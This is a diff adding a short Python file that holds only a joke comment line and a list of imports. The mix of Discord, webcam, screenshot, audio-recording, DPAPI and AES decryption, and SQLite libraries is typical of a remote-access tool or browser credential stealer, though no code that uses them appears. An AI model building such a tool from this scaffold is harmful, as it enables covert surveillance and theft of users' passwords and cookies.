@@ -1,0 +1,26 @@
+lamma dependancies lol xd haha rofl
+
+import subprocess
+import cv2
+import discord
+from discord.ext import commands
+import pyautogui
+import io
+import pyaudio
+import wave
+import os
+import psutil
+import shutil
+import json
+import base64
+import sqlite3
+import win32crypt
+from Crypto.Cipher import AES
+import time
+from datetime import datetime, timedelta
+import re
+import requests
+from discord import Embed
+from win32crypt import CryptUnprotectData
+
+
